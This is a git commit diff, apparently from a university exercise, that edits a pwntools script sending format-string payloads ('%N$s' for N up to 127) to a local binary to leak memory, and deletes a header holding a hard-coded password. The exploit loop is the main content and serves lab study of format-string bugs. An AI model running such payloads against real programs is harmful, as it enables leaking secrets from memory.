16de19934d4be5e2bc91b1c14d7cec3195b1e14c
argArthur <46555016+argArthur@users.noreply.github.com>
2024-06-10 01:28:53 -0300

    oi

--- hack.py
+++ hack.py
@@ -2,9 +2,9 @@ import pwn
 
 pwn.context.log_level = "critical"
 
-programa = pwn.ELF("./a.out")
+programa = pwn.ELF("./vuln")
 
-for i in range(0, 256):
+for i in range(0, 128):
 
     payload = b"".join([
         b"%" + str(i).encode("utf-8") + b"$s"
@@ -13,9 +13,8 @@ for i in range(0, 256):
     pty = pwn.process.PTY
     p = programa.process(stdin=pty, stdout=pty)
 
-    p.recvuntil(b"senha: ")
+    p.recvuntil(b">> ")
     p.sendline(payload)
     response = p.recvall().decode("latin-1")
     print(response)
-
 
--- segredo.h
+++
@@ -1,8 +0,0 @@
-#include <string.h>
-
-#define pass "bcc unesp 2024"
-
-void lerSenha(char buff[64]) {
-  strcpy(buff, pass);
-}
-
